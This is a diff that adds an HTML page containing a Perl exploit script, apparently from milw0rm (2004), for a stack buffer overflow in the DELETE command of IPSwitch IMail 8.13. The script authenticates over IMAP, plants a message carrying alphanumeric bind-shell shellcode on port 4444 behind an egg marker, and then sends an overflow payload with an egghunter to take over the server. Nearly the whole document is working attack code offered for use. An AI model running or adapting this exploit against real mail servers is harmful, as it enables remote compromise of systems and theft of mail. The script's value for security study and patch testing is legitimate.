@@ -1,0 +1,99 @@
+<html>
+<head>
+<title>IPSwitch IMail 8.13 (DELETE) Remote Stack Overflow Exploit</title>
+<pre>
+#!/usr/bin/perl -w
+###################################
+#
+# IPSwitch-IMail-8.13-DELETE
+#
+# Discovered by : Muts
+# Coded by : Zatlander
+# WWW.WHITEHAT.CO.IL
+#
+##################################
+#
+# Plain vanilla stack overflow in the DELETE command
+# Restrictions:
+#   - Need valid authentication credentials
+#   - Input buffer only allows characters between x20 -&gt; x7e
+#
+# Credits:
+#   - http://www.metasploit.org  - HD Moore for the metasploit shellcode
+#   - http://www.edup.tudelft.nl/~bjwever/menu.html - skylined for the ALPHA ascii shellcode generator
+#   - http://www.hick.org - for the syscall egghunt code in the paper &quot;Understanding Windows Shellcode&quot;
+#
+##################################
+
+use IO::Socket;
+use Getopt::Std;
+use Mail::IMAPClient;
+
+print &quot;Exploit for the IPSwitch IMail DELETE buffer overflow\n&quot;;
+print &quot;C0d3d by Zatlander\n&quot;;
+print &quot;Discovered by Muts\n&quot;;
+print &quot;WWW.WHITEHAT.CO.IL\n&quot;;
+print &quot;For hacking purposes only!!!\n\n&quot;;
+
+# Find shellcode with signature &quot;w00tw00t&quot;; start from esp
+# from 0 -&gt; $egghunter = &quot;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIVSyBUco0OKbWdp00ptH0uXqRnkHH2a3PLMvtvqzm6NulfePabTiaxbycrb09Gjt5xkTySjeTsEzFmSo2eXyoKRA&quot;;
+$egghunter = &quot;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJINkN44skpmkt7fPTpptx0UXpBLKkx1Q3PLMtT4QxMVN5lc5sQSDxqyrjSW2VYUJRUXkp9SjVdT5KVosKrWxioKRA&quot;;
+
+# Real shellcode: bind shell on port 4444 ( ./alpha edx &lt; shellcode.bin )
+$shellcode = &quot;JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLjH2vUP7puPQCQEV6aGnkbLWT28NkpEWLlKpT35QhgqKZlKPJvxLKQJWPuQXkKSdrSyLKgDLKuQJNVQ9okLP1KpLlP8kPBT7wyQXOVmvahGZKl25kSLwTGdqeKQlK2zUts1jKSVnktL0KNkaJWlUQxkLK7tnkUQM8zKgrVQYP1OqNQMQKkreXWpSnSZp03i1tlKGilKSkvlLKQK5Lnk7kLKckTH0SSXLNpN6nJLKOJvK9IWK1ZLuPfawps0Rwv63cMYiuJHDguPuPS0Np7qWp7pnV6ywhYwMttYt0Yym5QYK62inDvzd0Kwy4nMDniyXYUYkENMHKxmylgKpWPSVRSovS4ruPckLMpKupRqKOYGK9YOoyKsLMBUTTRJs7Ryv1RsYoTtNokOv534pYk9dDNnyrxrtkgWPTKOtwIoRutpfQkp2ppPrpF0spPPaPv09oRuFLniYWuaYKScpSe86bC07a3lmYIpSZVpRpQGyoruQ4QCF7kOv5thBsSdSgIoRuUpNiYWPhpCRmStwpoyXcLGyjDqIPnmQlQ4NLaz7e69zSlkNgJZosXlPTkvQT7TTP1TQvYWpDWTul5QUQLIcLTdRhK9SLQ4RlmY1letPPLMSt5tFpqDrppQRqCaSqSa2iBqRqRspQKO45uPbH0rKNNS4VKOpU5TyoXPLIyvKO45S0QxnMN9fexNYov5S4oyHCbJKOKOTvkOzsyorU30BHl0MZfdaOkORu7tFQyKPSIo8PA&quot;;
+
+getopts(&quot;h:u:p:&quot;, \%args);
+
+if ((!defined $args{h}) || (!defined $args{u}) || (!defined $args{p})) {
+   print &quot;Usage: $0 -h [host] -u [username] -p [password]\n&quot;;
+   exit;}
+
+$usr  = $args{u};
+$pwd  = $args{p};
+$host = $args{h};
+
+# jb +20; jnb +20  -&gt; jump over return address (0x21 is first ascii safe offset)
+$jmp21 = &quot;r!s!&quot;;
+
+# 0x6921526A -&gt; pointer to &quot;CALL [EDX+8]&quot; ends up in return address
+##########################################################################
+# This should hopefully be the only version dependent variable here.
+# Find an ASCII safe address pointing to a CALL [EDX+8] for your OS
+##########################################################################
+$calledx8 = &quot;jR!i&quot;;
+
+# aAA aligns ESP with the egghunter shellcode (popad, pop, pop)
+$asciieh = &quot;aAA&quot; . $egghunter;
+$asciisc = &quot;w00tw00t&quot; . $shellcode;
+$email =
+   &quot;From: \&quot;The guy hacking you\&quot; &lt;a\@b.com&gt;\r\n&quot; .
+   &quot;To: \&quot;Poor You\&quot; &lt;b\@c.com&gt;\r\n&quot; .
+   &quot;Subject: $asciisc\r\n&quot; .
+   &quot;Date: Wed, 3 Nov 2004 14:45:11 +0100\r\n&quot; .
+   &quot;Message-ID: &lt;000101c4c1acdcndj6d69b90$5e01a8c0\@snorlax&gt;\r\n&quot; .
+   &quot;Content-Type: text/plain;\r\n\tcharset=\&quot;us-ascii\&quot;\r\n&quot; .
+   &quot;Content-Transfer-Encoding: 7bit\r\n&quot; .
+   &quot;\r\n&quot; .
+   $asciisc;
+
+$payload = &quot;A&quot; x 236 . $jmp21 x 3 . $calledx8 . &quot;S&quot; x 29 . $asciieh . &quot;\r\n&quot;;
+
+print &quot;Login in to $host as $usr/$pwd\n&quot;;
+my $imap = Mail::IMAPClient-&gt;new( Server =&gt; $host, User =&gt; $usr, Password=&gt; $pwd) or die &quot;Cannot connect: $@&quot;;
+print &quot;count: &quot; . $imap-&gt;message_count(&quot;Inbox&quot;) . &quot;\n&quot;;
+print &quot;Sending EGG\n&quot;;
+$imap-&gt;select(&quot;Inbox&quot;) or die &quot;Could not select: $@\n&quot;;
+my $uid = $imap-&gt;append( &quot;Inbox&quot;, $email ) or die &quot;Cannot append: $@&quot;;
+$msg =  $imap-&gt;message_string($uid) or die &quot;Cannot get message: $@&quot;;
+#$msg =  $imap-&gt;body_string($uid) or die &quot;Cannot get message: $@&quot;; 
+#print &quot;retrieving $uid back: $msg\n&quot;;
+
+print &quot;Overflowing DELETE\n&quot;;
+$imap-&gt;delete($payload) or die &quot;Cannot delete: $@n&quot;;
+
+print(&quot;Finished...\n&quot;);
+
+# milw0rm.com [2004-11-12]
+</pre>
+</html>
+
